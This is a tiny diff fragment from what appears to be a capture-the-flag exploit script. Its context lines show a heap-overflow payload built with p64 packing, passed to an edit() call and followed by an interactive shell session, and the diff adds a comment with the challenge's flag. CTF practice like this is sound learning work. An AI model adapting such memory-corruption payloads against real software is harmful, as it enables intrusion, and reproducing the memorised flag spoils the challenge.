@@ -44,3 +44,5 @@ edit(0, -1, b"A" * (0x20)  +(p64(0x00)*7)+ p64(0x100)+ b'\x45\x7A\x20\x57\x00'*1
 # win()
 
 r.interactive()
+
+# UMASS{$0m3on3!_g37z_4ng$ty_wh3n_ptr4c3_w0rkz!!!}
